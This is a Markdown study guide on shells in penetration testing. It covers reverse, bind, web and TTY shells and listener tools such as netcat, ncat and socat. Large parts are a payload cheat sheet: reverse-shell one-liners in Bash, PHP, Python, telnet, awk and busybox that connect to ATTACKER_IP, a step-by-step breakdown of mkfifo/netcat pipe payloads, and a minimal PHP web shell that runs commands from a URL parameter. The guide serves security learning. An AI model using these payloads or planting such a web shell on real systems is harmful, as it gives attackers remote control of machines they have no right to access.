# Shells Overview

## What is a Shell ?
- A shell is a program that allows a user to interact with an operating system.
- It can be:
  - GUI (Graphical User Interface) - windows, icons, buttons.
  - CLI (Command-Line Interface) - commands typed in a terminal (e.g, Bash, PowerShell).
- In cybersecurity, a shell usually means remote command-line access to a target machine, allowing an attacker or penetration tester to execute commands on that system.

## Why are Shells Important ?
Once an attacker gains a shell, they can interact with the system almost as if they were physically using it. This makes the shell one of the most valuable goals during exploitation.

## What Can an Attacker Do with a Shell ?

- **Remote System Control**
  - Run commands, execute programs, and manage the system remotely.
> allows the attacker to execute commands or software remotely in the target system

- **Privilege Escalation**
  - Attempt to gain higher privileges (e.g, Administrator or Root) if the current access is limited.
> If initial access through a shell is limited or restricted, attackers can explore ways to escalate privileges to more elevated or administrative access

- **Data Exfiltration**
  - Browse files, read sensitive information, and copy valuable data from the target.
> Once attackers have access to execute commands through an obtained shell, they can explore the system to read and copy sensitive data from it

- **Persistence and Maintenance Access**
  - Create new user accounts, install backdoors, or modify the system to maintain future access.

> Persistence and Maintenance Access are techniques used by attackers to ensure they can continuously control a compromised system. Persistence refers to methods that allow attackers to retain access even after system reboots or security measures, like creating hidden user accounts or installing backdoors. Maintenance Access involves keeping control over a compromised system for ongoing management, enabling attackers to update their malware or manage persistence without needing to re-exploit the system. Together, they ensure that attackers can maintain and manage their control over the target system effectively.

- **Post-Exploitation**
  - Perform actions after initial access, such as installing malware, changing configurations, hiding activity, or deleting logs.
> After access to a shell is granted, attackers can perform a wide range of post-exploitation activities, such as deploying malware, creating hidden accounts, and deleting information

- **Pivoting**
  - Use the compromised machine as a stepping stone to access and attack other systems within the same network.
> Depending on the attacker's intentions, the obtained shell can be just an initial access point. The goal can be to hop through the network to a different target using the obtained shell as a pivot to different points in the compromised system network. This is also known as pivoting

## Why Learn About Shells ?
- Essential for penetration testing after gaining initial access.
- Helps understand how attackers operate after compromising a system.
- Helps defenders detect and respond to unauthorized remote access.

## Reverse Shell

## What is a Reverse Shell ?
- A Reverse Shell is a shell where the target (victim) initiates the connection back to the attacker's machine.
- Instead of the attacker connecting to the victim, the victim connects to the attacker.
- Also called a "Connect Back Shell."

### Why use it ?

<img width="600" height="300" alt="image" src="https://github.com/user-attachments/assets/1fb9447e-bb81-490c-9395-604b1b5eabf3" />

Since the connection is outbound from the victim, it is more likely to bypass firewalls and network security devices that block incoming connections.

---

## How a Reverse Shell Works ? 

### Step 1: Attacker Starts a Listener
The attacker waits for an incoming connection using Netcat (nc).

```bash
nc -lvnp 443
```

**Options:**
- `-l` → Listen for incoming connections.
- `-v` → Verbose mode (Verbose means providing more details or information than usual)
- `-n` → Don't resolve DNS names / prevents the connections from using DNS for lookup, so it will not resolve any hostname it will use an IP address
- `-p 443` → Listen on port 443.

**Why port 443 ?**
Attackers often use common ports (80, 443, 53, etc.) because they blend with normal web/DNS traffic and are less likely to be blocked.

### Step 2: Victim Executes a Reverse Shell Payload
- A vulnerability or command execution allows the victim to run a reverse shell payload.
- The payload tells the victim machine to connect back to the attacker's IP and port.
- Once connected, the victim's shell is redirected over the network to the attacker.

### Step 3: Attacker Receives the Shell
- The listener receives the incoming connection.
- The attacker now has a remote command-line shell on the victim machine.
- Commands typed by the attacker execute on the victim system.

```
Attacker  <--------------------  Victim
 Listener       Connection        Reverse Shell
 (nc -lvnp 443)  <--------------  Payload executes
```

#### Example terminal 
```terminal
attacker@kali:~$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964
To run a command as administrator (user "root"), use "sudo ".
See "man sudo_root" for details.

target@tryhackme:~$
```
The output above shows the connection coming from the IP 10.10.13.37, which is the IP address of the compromised target.

## Reverse Shell Payload (Concept)

A reverse shell payload generally performs these actions :

1. Creates a communication channel.
2. Starts a shell (e.g., Bash).
3. Connects to the attacker's IP and port.
4. Sends command output back to the attacker.
5. Receives new commands continuously.

> **Note :** Payloads differ depending on the operating system and available tools (Bash, Python, PowerShell, Netcat, etc.).

---

## Reverse Shell (Pipe Reverse Shell Example)

### Step 1: Attacker Starts a Listener
```bash
nc -lvnp 443
```

#### Meaning of Flags

| Flag | Meaning |
|------|---------|
| `-l` | Listen for incoming connections |
| `-v` | Verbose output |
| `-n` | Don't resolve DNS names (use IP directly) |
| `-p` | Listen on the specified port |

The attacker is now **waiting** for the target to connect.

### Step 2: Reverse Shell Payload Executes on Target

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

> **Note:** This is **one example of a reverse shell payload**. There are many other payloads depending on the operating system, shell available, programming language, and target environment (Bash, Python, PHP, Perl, PowerShell, Netcat, etc.).

---

## Payload Breakdown

### 1. Remove old FIFO

```bash
rm -f /tmp/f
```

Removes any previous named pipe so a new one can be created.

> -f (force) : Executes the command without prompting for confirmation and ignores errors if the target does not exist.

### 2. Create FIFO

```bash
mkfifo /tmp/f
```

Creates the communication pipe.

### 3. Read from FIFO

```bash
cat /tmp/f
```

At first the FIFO is empty.

So cat does not exit.

Instead it waits (blocks) until someone writes data into the FIFO.

### 4. Start Interactive Shell

```bash
sh -i
```

Starts an **interactive shell**.

Whatever `cat` reads becomes the shell's input.

So:

```
cat /tmp/f
      │
      ▼
   sh -i
```

Commands arriving through the FIFO are executed by the shell.

### 5. Redirect Errors

```bash
2>&1
```

Normally:

- stdout → terminal
- stderr → terminal

`2>&1` means:

> Redirect stderr (2) to the same destination as stdout (1).

This ensures both normal output and error messages are sent back to the attacker.

### 6. Send Output to Attacker

```bash
nc ATTACKER_IP ATTACKER_PORT
```

Netcat connects to the attacker.

Everything produced by the shell is sent through the network.

```
Shell Output
      │
      ▼
    Netcat
      │
      ▼
Attacker Listener
```

### 7. Feed Commands Back into FIFO

```bash
>/tmp/f
```

Whatever the attacker types is written back into the FIFO.

That means:

```
Attacker Command
       │
       ▼
     Netcat
       │
       ▼
 FIFO (/tmp/f)
       │
       ▼
      cat
       │
       ▼
    sh -i
```

The shell receives the next command.

---

## Why Doesn't It Get Stuck ?

At first it looks like:

```bash
cat /tmp/f
```

would wait forever.

It **does wait**, but that's expected.

The important part is that all commands connected with `|` (pipes) are started **at the same time** as separate processes.

```
cat
 │
 ▼
sh
 │
 ▼
nc
```

They run **concurrently (in parallel)** and wait for each other whenever needed.

- `cat` waits for input from FIFO.
- `sh` waits for commands from `cat`.
- `nc` waits for network data.

As soon as the attacker types a command, the whole chain becomes active.

## Continuous Communication Loop

The payload forms a continuous loop:

```
          Attacker
              │
              ▼
        Netcat Listener
              │
              ▼
      Netcat (Target)
              │
              ▼
         FIFO (/tmp/f)
              │
              ▼
         cat /tmp/f
              │
              ▼
          sh -i (Shell)
              │
              ▼
     Command Output + Errors
              │
              └──────────────► Netcat
                               │
                               ▼
                           Attacker
```

The attacker types commands.
          ↓
Commands travel through Netcat.
          ↓
Commands are written into the FIFO.
          ↓
`cat` reads them.
          ↓
`sh` executes them.
          ↓
Output and errors go back through Netcat.
          ↓
The attacker receives the results.

The process repeats continuously until either side closes the connection.

---

#### Standard Streams (0, 1, 2)

Every Linux process has three standard streams:

| Number | Name | Default Device |
|---------|------|----------------|
| **0** | Standard Input (stdin) | Keyboard |
| **1** | Standard Output (stdout) | Screen/Terminal |
| **2** | Standard Error (stderr) | Screen/Terminal |

Normally:

```
Keyboard
    │
 stdin (0)
    │
 Program
   │    │
stdout stderr
 (1)    (2)
   │      │
Screen  Screen
```

---

### FIFO (Named Pipe)

The command:

```bash
mkfifo /tmp/f
```

creates a **FIFO (First In, First Out) named pipe**.

A FIFO is **not a normal file**.

- It **does not permanently store data**
- It simply transfers data between processes
- If nobody writes into it, any reader waits (blocks)

Think of it like a water pipe If nobody pours water into the pipe, the reader simply waits.

---

| Operator | Meaning |
|----------|---------|
| `;` | Run the next command **always**, regardless of whether the previous command succeeds or fails. |
| `&&` | Run the next command **only if the previous command succeeds** (exit status = 0). |
| `\|\|` | Run the next command **only if the previous command fails** (non-zero exit status). |

---

## Key Points

- Reverse shell = Target connects back to the attacker.
- `nc -lvnp <port>` waits for the incoming connection.
- `mkfifo` creates a **named pipe (FIFO)** for communication.
- `cat /tmp/f` initially **blocks (waits)** because the FIFO is empty.
- The pipeline (`cat | sh | nc`) starts **all processes concurrently**, so it doesn't deadlock.
- `sh -i` executes commands interactively.
- `2>&1` sends both normal output and errors back to the attacker.
- `>/tmp/f` feeds the attacker's next command back into the FIFO, creating a **continuous command-response loop**.
- This is **one example** of a reverse shell payload; many other payloads exist for different operating systems and environments.
  
---

## Why Reverse Shells are Popular ? 
- Victim initiates the connection.
- Better chance of bypassing firewalls/NAT.
- Gives interactive remote command execution.
- Common technique after successful exploitation.

## Summary
**Reverse Shell = Victim → Attacker**

Victim executes a payload → Connects back to attacker's listener → Attacker gains remote shell access.

## Bind Shell

### What is a Bind Shell ?

A Bind Shell is a shell where the target machine opens (binds) a port and waits (listens) for an incoming connection. The attacker then connects to that open port and gains remote command execution.

Unlike a Reverse Shell, the target does not initiate the connection. Instead, the attacker initiates the connection.

<img width="705" height="582" alt="image" src="https://github.com/user-attachments/assets/dd818f05-dab3-4f5d-946d-a1675e2615fb" />

> **Flow :**
> **Target (Listener) ⟵ Attacker (Connects)**

---

## Why Use a Bind Shell ?

A bind shell is useful when:

- The target cannot make outgoing connections (egress (outgoing) traffic is blocked).
- The attacker can reach the target directly over the network.

However, bind shells are less common because:

- The target must keep a port open and listening.
- Open listening ports are easier for defenders to detect.
- Firewalls often block inbound connections.

---

## How a Bind Shell Works

### Step 1 — Target Creates a Listener

The compromised machine executes the following payload:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 >/tmp/f
```

This command exposes an interactive Bash shell on port 8080.

---

## Understanding the Payload

### Full Payload

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 >/tmp/f
```

### 1. Remove old FIFO

```bash
rm -f /tmp/f
```

- Removes any previous FIFO.
- `-f` = **force**
- Doesn't ask for confirmation.
- Doesn't show an error if the file doesn't exist.

### 2. Create a FIFO

```bash
mkfifo /tmp/f
```

Creates a **named pipe (FIFO)**.

A FIFO is like a pipe with a filename.

It **does not store data** like a normal file.

Instead, it transfers data between processes.

Think of it like:

```
Writer  ----->  [FIFO]  -----> Reader
```

If nobody writes into it, the reader simply waits.

### 3. Read from the FIFO

```bash
cat /tmp/f
```

At first this FIFO is empty.

So `cat` simply **blocks (waits)** until data is written into the pipe.

It is **not stuck forever**—it is waiting for input.

### 4. Start Interactive Bash

```bash
| bash -i
```

Everything read by `cat` becomes input to Bash.

`-i` starts an **interactive shell**, allowing commands like:

```bash
ls
pwd
whoami
```

### 5. Redirect Errors

```bash
2>&1
```

Linux file descriptors:

| Descriptor | Meaning | Default Device |
|------------|---------|----------------|
| 0 | Standard Input (stdin) | Keyboard |
| 1 | Standard Output (stdout) | Screen |
| 2 | Standard Error (stderr) | Screen |

`2>&1` means:

> Send **stderr** wherever **stdout** is currently going.

This ensures both normal output and error messages are sent back to the attacker.

### 6. Start Netcat Listener

```bash
| nc -l 0.0.0.0 8080
```

Meaning:

- `nc` → Netcat
- `-l` → Listen mode
- `0.0.0.0` → Listen on **all network interfaces**
- `8080` → Port to listen on

Unlike a reverse shell, Netcat **waits for the attacker** to connect.

### 7. Send Incoming Data Back into FIFO

```bash
>/tmp/f
```

Anything received from the attacker's Netcat connection is written into the FIFO.

That data becomes input for:

```
cat → bash
```

#### Note : 
This payload is almost identical to the reverse shell payload we studied. The only major difference is the Netcat part :
- Reverse Shell: nc ATTACKER_IP ATTACKER_PORT → target connects out to the attacker.
- Bind Shell: nc -l 0.0.0.0 8080 → target listens, and the attacker connects in.

---

## The Continuous Communication Loop

The following commands work together **simultaneously**:

```text
  cat /tmp/f
      │
      ▼
  bash -i
      │
      ▼
Netcat Listener
      │
      ▼
   /tmp/f
```

This creates a continuous loop:

```
  Attacker
     │
     ▼
Netcat Listener
     │
     ▼
    FIFO
     │
     ▼
   Bash
     │
     ▼
  Output
     │
     ▼
   Netcat
     │
     ▼
  Attacker
```

Although `cat /tmp/f` initially waits because the FIFO is empty, **all processes run concurrently**.

Once the attacker connects and sends a command:

```
Attacker types:
ls
```

the flow becomes:

```
 Attacker
    │
    ▼
  Netcat
    │
    ▼
   FIFO
    │
    ▼
   cat
    │
    ▼
   bash
    │
    ▼
Command Output
    │
    ▼
  Netcat
    │
    ▼
 Attacker
```

Because the output is written back into the FIFO, the loop continues indefinitely, allowing an interactive shell session.

---

### Step 2 — Attacker Connects

The attacker runs:

```bash
nc -nv TARGET_IP 8080
```

Meaning:

- `nc` → Netcat
- `-n` → Don't perform DNS lookups
- `-v` → Verbose mode
- `TARGET_IP` → Target machine
- `8080` → Listening port
  
#### Example : Attacker Terminal (After Connection)

```terminal
attacker@kali:~$ nc -nv 10.10.13.37 8080 
(UNKNOWN) [10.10.13.37] 8080 (http-alt) open
target@tryhackme:~$
```

---

## Connection Established

```
   Attacker
      │
      ▼
   Netcat
      │
      ▼
Target Port 8080
      │
      ▼
 Bash Shell
```

The attacker now has an interactive shell on the target machine.

---

## Reverse Shell vs Bind Shell

| Reverse Shell | Bind Shell |
|---------------|------------|
| Target connects to attacker | Attacker connects to target |
| Attacker starts listener | Target starts listener |
| Better at bypassing firewalls | Easier to detect due to open listening port |
| More commonly used | Less commonly used |

---

## Important Notes

- This is one example of a Bind Shell payload.
- Different operating systems, shells, tools, and environments use different payloads.
- The payload shown here uses:
  - `bash`
  - `Netcat`
  - `FIFO (mkfifo)`
- Other bind shell payloads may use **Python**, **Perl**, **PHP**, **PowerShell**, **Socat**, or other tools.

---

## Key Takeaway

A Bind Shell works by making the target machine open a listening port. The attacker then connects to that port, and the FIFO + Bash + Netcat pipeline creates a continuous loop that enables an interactive remote shell.

## Shell Listeners

### What is a Shell Listener ?

A Shell Listener is a program running on the attacker's machine that waits for an incoming reverse shell connection from the compromised target.

Without a listener, a reverse shell has nowhere to connect.

**Flow:**

> **Note :** Netcat is the most common listener, but several other tools provide additional features.

---

## 1. Netcat (nc)

The simplest and most commonly used shell listener.

### Command

```bash
nc -lvnp 443
```

### Options

| Option | Meaning |
|---------|---------|
| `-l` | Listen for incoming connections |
| `-v` | Verbose output |
| `-n` | Do not resolve DNS names |
| `-p` | Specify listening port |

### Pros

- Lightweight
- Installed on most Linux systems
- Very easy to use

### Cons

- No command history
- Arrow keys usually don't work
- No encryption

---

## 2. Rlwrap

`rlwrap` is **not a listener by itself**.

It wraps around programs like Netcat to provide a much better interactive shell.

### Command

```bash
rlwrap nc -lvnp 443
```

### Features

- Command history
- Arrow key support
- Line editing
- Better shell experience

### Why use it?

Instead of:

```bash
nc -lvnp 443
```

use:

```bash
rlwrap nc -lvnp 443
```

for a much more comfortable shell.

---

## 3. Ncat

Ncat is the **improved version of Netcat**, developed by the **Nmap Project**.

It supports several advanced features, including **SSL encryption**.

### Basic Listener

```bash
ncat -lvnp 443
```

### SSL Listener

```bash
ncat --ssl -lvnp 443
```

### `--ssl`

Enables **encrypted communication** between the attacker and the target.

### Pros

- SSL/TLS encryption
- More features than Netcat
- Better for real-world engagements

---

## 4. Socat

Socat (**SOcket CAT**) is a powerful networking utility that creates connections between different data streams.

It is often used to create **fully interactive shells**.

### Command

```bash
socat -d -d TCP-LISTEN:443 STDOUT
```

### Options

| Option | Meaning |
|---------|---------|
| `-d -d` | Verbose output (more debugging information) |
| `TCP-LISTEN:443` | Listen for TCP connections on port 443 |
| `STDOUT` | Print received data to the terminal |

### Pros

- Very powerful
- Supports many protocols
- Can create stable interactive shells
- Commonly used during advanced penetration tests

---

## Comparison

| Tool | Purpose | Advantages | Limitations |
|------|----------|------------|-------------|
| **Netcat (nc)** | Basic listener | Simple, lightweight | No history, no encryption |
| **Rlwrap** | Enhances Netcat | Arrow keys, history, editing | Requires Netcat |
| **Ncat** | Improved Netcat | SSL support, more features | Slightly larger than Netcat |
| **Socat** | Advanced networking tool | Stable, powerful, flexible | More complex syntax |

---

## Key Takeaways

- A **listener waits for incoming reverse shell connections**.
- **Netcat** is the most commonly used listener.
- **Rlwrap** improves the usability of Netcat by adding command history and line editing.
- **Ncat** extends Netcat with features like **SSL encryption**.
- **Socat** is a more advanced utility capable of creating stable and flexible shell connections.

## Shell Payloads

## What is a Shell Payload ?

A Shell Payload is a command or script that establishes a remote shell between the attacker and the target.

There are two main types:

- **Reverse Shell:** The target initiates the connection to the attacker.
- **Bind Shell:** The target opens a listening port, and the attacker connects to it.

> **Note :** There is **no single universal payload**. The payload depends on:
> - Programming language available (Bash, PHP, Python, etc.)
> - Operating System
> - Installed tools (Netcat, BusyBox, Telnet, etc.)
> - Target environment and restrictions

---

## Bash Payloads

### 1. Normal Bash Reverse Shell

```bash
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```

**Explanation**
- Opens an interactive Bash shell.
- Uses Bash's `/dev/tcp` feature.
- Redirects stdin, stdout, and stderr through the TCP connection.

### 2. Bash Read Line Reverse Shell

```bash
exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
```

**Explanation**
- Opens TCP socket using **file descriptor 5**.
- Continuously reads commands from the attacker.
- Executes commands and sends output back over the same socket.

### 3. Bash Reverse Shell (FD 196)

```bash
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196
```

**Explanation**
- Uses **file descriptor 196** for communication.
- Redirects shell input/output/error through that descriptor.

### 4. Bash Reverse Shell (FD 5)

```bash
bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
```

**Explanation**
- Interactive Bash shell.
- Uses **file descriptor 5** instead of standard descriptors.

---

## PHP Payloads

### 5. PHP Reverse Shell (exec)

```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
```

**Explanation**
- Creates a socket.
- Executes `/bin/sh` using **exec()**.

### 6. PHP Reverse Shell (shell_exec)

```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
```

**Explanation**
- Same concept as above.
- Uses **shell_exec()** to execute the shell.

### 7. PHP Reverse Shell (system)

```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'
```

**Explanation**
- Uses **system()**.
- Executes commands and prints output.

### 8. PHP Reverse Shell (passthru)

```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
```

**Explanation**
- Uses **passthru()**.
- Sends raw command output (useful for binary data).

### 9. PHP Reverse Shell (popen)

```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3","r");'
```

**Explanation**
- Uses **popen()**.
- Opens a shell as a process stream.

---

## Python Payloads

### 10. Python Reverse Shell (Environment Variables)

```bash
export RHOST="ATTACKER_IP"
export RPORT=443

python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```

**Explanation**
- Reads attacker IP/port from environment variables.
- Creates socket connection.
- Redirects stdin, stdout, stderr.
- Spawns interactive Bash.

### 11. Python Reverse Shell (subprocess)

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("bash")'
```

**Explanation**
- Creates TCP socket.
- Redirects shell I/O.
- Spawns Bash using Python.

### 12. Short Python Reverse Shell

```bash
python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("bash")'
```

**Explanation**
- Compact one-line reverse shell.
- Performs the same task as the longer payload.

---

## Other Payloads

### 13. Telnet Reverse Shell

```bash
TF=$(mktemp -u)
mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF
```

**Explanation**
- Creates a FIFO (named pipe).
- Connects to the attacker using Telnet.
- Executes commands through the pipe.

### 14. AWK Reverse Shell

```bash
awk 'BEGIN {s="/inet/tcp/0/ATTACKER_IP/443"; while(42){ do{ printf "shell>" |& s; s |& getline c; if(c){ while((c |& getline)>0) print $0 |& s; close(c);} } while(c!="exit"); close(s); }}' /dev/null
```

**Explanation**
- Uses AWK's built-in TCP networking.
- Reads commands from the attacker.
- Executes them and sends output back.

### 15. BusyBox Reverse Shell

```bash
busybox nc ATTACKER_IP 443 -e sh
```

**Explanation**
- Uses BusyBox's Netcat.
- Connects back to the attacker.
- Executes `/bin/sh`.
- Common on routers, IoT devices, and embedded Linux systems.

| Language/Tool | Common Use Case |
|---------------|-----------------|
| **Bash** | Linux systems with Bash available |
| **PHP** | PHP web applications after RCE |
| **Python** | Systems with Python installed |
| **Telnet** | Systems where Telnet is available |
| **AWK** | Minimal Unix/Linux systems |
| **BusyBox** | Embedded Linux, routers, IoT devices |

> **Key Point:** Every payload has the **same goal** - to provide a remote shell. The only difference is **which language or tool is available on the target system**, so attackers choose the payload that best fits the environment.

## Web Shell

### What is a Web Shell ?

A Web Shell is a malicious script written in a language supported by a web server (e.g, PHP, ASP, JSP, CGI) that allows an attacker to execute operating system commands through a web browser.

Unlike reverse or bind shells, a web shell is hosted on the web server and is accessed over HTTP/HTTPS.

---

## How a Web Shell Works

1. Attacker uploads a web shell (e.g., `shell.php`) by exploiting a vulnerability such as:
- **Unrestricted File Upload** – Uploading malicious files (e.g., a PHP web shell) because the server doesn't properly validate uploaded files.
- **File Inclusion (LFI/RFI)** – Exploiting a vulnerability to make the server load and execute local (LFI) or remote (RFI) files.
- **Command Injection** – Injecting operating system commands into a vulnerable application, allowing arbitrary command execution.
- **Stolen Credentials / Unauthorized Access** – Using stolen or compromised login credentials to access the server and upload or install a web shell.

2. The web shell is stored on the web server.

3. The attacker accesses the shell through a browser.

4. Commands are sent as URL parameters or form data.

5. The web server executes the command and returns the output.

---

## Example PHP Web Shell

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

### How it works

- `$_GET['cmd']` → Reads the value of the **cmd** parameter from the URL.
- `system()` → Executes the command on the operating system.
- The command output is displayed in the browser.

---


## Difference Between Reverse Shell and Web Shell

| Reverse Shell | Web Shell |
|--------------|-----------|
| Target connects back to attacker | Attacker sends HTTP requests to the server |

- A **Web Shell is simply a script** uploaded to a web server.
- It allows attackers to execute OS commands remotely through a browser.
- Usually uploaded after exploiting vulnerabilities like **File Upload**, **File Inclusion**, or **Command Injection**.
- Can be used for:
  - Command execution
  - File upload/download
  - File management
  - Privilege escalation
  - Persistence
- Since it is just a web page/script, it can be difficult to detect if hidden inside a legitimate application.

## Shell Types & When to Use Them

## 1. Reverse Shell  (Most Common)

**What is it ?**

- The **target initiates** a connection back to the attacker.
- The attacker listens for the incoming connection.

**Use When**

- Outbound connections are allowed.
- Inbound connections are blocked by Firewall/NAT.
- You want to blend with normal HTTP/HTTPS traffic.

**Advantages**

- Works behind NAT/firewalls.
- Harder to detect.
- Most commonly used in penetration testing and CTFs.

**Limitations**

- Won't work if outbound traffic is blocked.

## 2. Bind Shell

**What is it ?**
- The **target opens a listening port**.
- The attacker connects directly to that port.

**Use When**
- Outbound connections are blocked.
- Inbound connections are allowed.
- The attacker can directly reach the target.

**Advantages**
- Simple to set up.
- No outbound connection required.

**Limitations**
- Easy to detect (open listening port).
- Often blocked by firewalls or NAT.

## 3. Web Shell

**What is it ?**
- A script (PHP, ASP, JSP, etc.) uploaded to a web server that executes system commands through HTTP/HTTPS requests.

**Use When**
-File Upload vulnerability.
Command Injection.
File Inclusion (LFI/RFI).
Compromised web server.

**Advantages**
- Blends with normal web traffic.
- Doesn't require Netcat.
- Can be used to launch a Reverse Shell later.

**Limitations**
- Limited by web server permissions.
- Can be detected if the web shell file is discovered.

## 4. TTY (Teletypewriter) / Interactive Shell

**What is it ?**
- Upgrades a basic shell into a fully interactive terminal.

**Use When**
- After obtaining a Reverse or Bind Shell.
- Need arrow keys, tab completion, Ctrl+C, editors, sudo, etc.

**Advantages**
- Feels like a normal terminal.
- Much easier to work with.

**Limitations**
- Requires an existing shell first.

## Quick Comparison

| Shell             | Best Used When                       | Main Advantage             | Main Limitation                  |
| ----------------- | ------------------------------------ | -------------------------- | -------------------------------- |
| **Reverse Shell** | Outbound allowed, inbound blocked    | Bypasses NAT/Firewall      | Fails if outbound is blocked     |
| **Bind Shell**    | Outbound blocked, inbound allowed    | Simple setup               | Open port is easy to detect      |
| **Web Shell**     | Web application vulnerability exists | Works over HTTP/HTTPS      | Limited to web server privileges |
| **TTY Shell**     | Already have a shell                 | Fully interactive terminal | Needs an existing shell first    |

#### Decision Flow
```
Can the target make outbound connections ?
│
├── YES
│     │
│     └── Use Reverse Shell 
│
└── NO
      │
      ├── Can attacker reach target directly?
      │
      ├── YES
      │      │
      │      └── Use Bind Shell 
      │
      └── NO
             │
             ├── Is there a web application vulnerability?
             │
             ├── YES
             │      │
             │      └── Use Web Shell → Then try Reverse Shell
             │
             └── Need another access method (pivoting, tunneling, SSH, etc.)
```
---

## Conclusion

- **Reverse Shell** – Target initiates a connection back to the attacker, giving the attacker remote command execution.
- **Bind Shell** – Target listens on a port, and the attacker connects to it to obtain a shell.
- **Web Shell** – A malicious script (e.g., PHP, ASP, JSP) uploaded to a web server that executes commands via a web browser.

### Why are shells important ?

- **For Attackers / Pentesters:** Gain remote access, execute commands, perform privilege escalation, maintain persistence, and move laterally.
- **For Defenders:** Detect, investigate, and prevent unauthorized remote access and post-exploitation activities.

**Key takeaway:** Understanding how different shell types work helps both offensive security professionals perform assessments and defensive teams detect and respond to attacks effectively.
